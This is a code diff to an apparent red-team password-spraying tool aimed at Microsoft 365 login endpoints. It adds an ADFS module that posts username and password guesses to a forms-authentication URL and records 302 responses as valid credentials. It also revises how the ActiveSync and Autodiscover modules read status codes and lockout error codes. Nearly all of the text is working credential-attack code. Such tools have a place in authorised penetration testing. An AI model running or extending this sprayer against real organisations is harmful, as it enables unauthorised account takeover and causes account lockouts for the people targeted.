@@ -4,7 +4,9 @@
 #           https://github.com/Raikia/UhOh365
 #           https://github.com/dafthack/MSOLSpray
 #           '-> https://gist.github.com/byt3bl33d3r/19a48fff8fdc34cc1dd1f1d2807e1b7f
+#           https://github.com/Mr-Un1k0d3r/RedTeamScripts/blob/master/adfs-spray.py
 
+import re
 import time
 import urllib3
 import asyncio
@@ -41,7 +43,8 @@ class Sprayer:
         self._modules = {
             'autodiscover': self._autodiscover,
             'activesync':   self._activesync,
-            'msol':         self._msol
+            'msol':         self._msol,
+            'adfs':         self._adfs
         }
 
 
@@ -103,19 +106,16 @@ class Sprayer:
             response = self._send_request(requests.options, url, auth=auth, headers=headers)
             status   = response.status_code
 
+            # Note: 403 responses no longer indicate that an authentication attempt was valid, but now indicates
+            #       invalid authentication attempts (whether it be invalid username or password). 401 responses
+            #       also indicate an invalid authentication attempt
             if status == 200:
                 print("[%sVALID_CREDS%s]\t\t%s:%s%s" % (text_colors.green, text_colors.reset, email, password, self.helper.space))
                 self.valid_creds.append('%s:%s' % (email, password))
                 self.userlist.remove(user)  # Remove valid user from being sprayed again
 
-            elif status == 403:
-                msg = password + " (Manually confirm [MFA, Locked, etc.])"
-                print("[%sFOUND_CREDS%s]\t\t%s:%s%s" % (text_colors.green, text_colors.reset, email, password, self.helper.space))
-                self.valid_creds.append('%s:%s' % (email, password))
-                self.userlist.remove(user)  # Remove valid user from being sprayed again
-
             else:
-                print("[%sINVALID_CREDS%s]\t\t%s:%s%s" % (text_colors.red, text_colors.reset, email, password, self.helper.space), end='\r')
+                print("[%sINVALID%s]\t\t%s:%s%s" % (text_colors.red, text_colors.reset, email, password, self.helper.space), end='\r')
 
         except Exception as e:
             if self.args.debug: print("\n[ERROR]\t\t\t%s" % e)
@@ -174,7 +174,8 @@ class Sprayer:
                         # Handle AADSTS errors - remove user from future rotations
                         if any(code in response.headers["X-AutoDiscovery-Error"] for code in Config.AADSTS_codes.keys()):
                             # This is where we handle lockout termination
-                            # For now, we will just stop future sprays if a single lockout is hit
+                            # NOTE: It appears that Autodiscover is now showing lockouts no accounts that are valid, but failed authentication
+                            #       so this value may not actually indicate the correct number of locked accounts.
                             if code == "AADSTS50053":
                                 self.lockout += 1  # Keep track of locked accounts seen
 
@@ -184,7 +185,10 @@ class Sprayer:
                             self.userlist.remove(user)
 
                         else:
-                            print("[%sINVALID_CREDS%s]\t\t%s:%s%s" % (text_colors.red, text_colors.reset, email, password, self.helper.space), end='\r')
+                            print("[%sINVALID%s]\t\t%s:%s%s" % (text_colors.red, text_colors.reset, email, password, self.helper.space), end='\r')
+
+                else:
+                    print("[%sINVALID%s]\t\t%s:%s%s" % (text_colors.red, text_colors.reset, email, password, self.helper.space), end='\r')
 
         except Exception as e:
             if self.args.debug: print("\n[ERROR]\t\t\t%s" % e)
@@ -247,7 +251,43 @@ class Sprayer:
                     self.userlist.remove(user)
 
                 else:
-                    print("[%sINVALID_CREDS%s]\t\t%s:%s%s" % (text_colors.red, text_colors.reset, email, password, self.helper.space), end='\r')
+                    print("[%sINVALID%s]\t\t%s:%s%s" % (text_colors.red, text_colors.reset, email, password, self.helper.space), end='\r')
+
+        except Exception as e:
+            if self.args.debug: print("\n[ERROR]\t\t\t%s" % e)
+            pass
+
+
+    """ Spray users via a managed ADFS server """
+    # https://github.com/Mr-Un1k0d3r/RedTeamScripts/blob/master/adfs-spray.py
+    def _adfs(self, user, password):
+        try:
+            headers = Config.headers  # Grab external headers from config.py
+
+            # Build email if not already built
+            email = self.helper.check_email(user, self.args.domain)
+
+            # Keep track of tested names in case we ctrl-c
+            self.tested_creds.append('%s:%s' % (email, password))
+
+            # Fix the ADFS URL for each user since the AuthUrl was pulled during validation using a
+            # bogus user
+            adfs_url = re.sub('username=user', f'username={user}', self.args.adfs)
+
+            time.sleep(0.250)
+
+            data     = "UserName=%s&Password=%s&AuthMethod=FormsAuthentication" % (email, password)
+            url      = adfs_url
+            response = self._send_request(requests.post, url, data=data, headers=headers)
+            status   = response.status_code
+
+            if status == 302:
+                print("[%sVALID_CREDS%s]\t\t%s:%s%s" % (text_colors.green, text_colors.reset, email, password, self.helper.space))
+                self.valid_creds.append('%s:%s' % (email, password))
+                self.userlist.remove(user)  # Remove valid user from being sprayed again
+
+            else:
+                print("[%sINVALID%s]\t\t%s:%s%s" % (text_colors.red, text_colors.reset, email, password, self.helper.space), end='\r')
 
         except Exception as e:
             if self.args.debug: print("\n[ERROR]\t\t\t%s" % e)
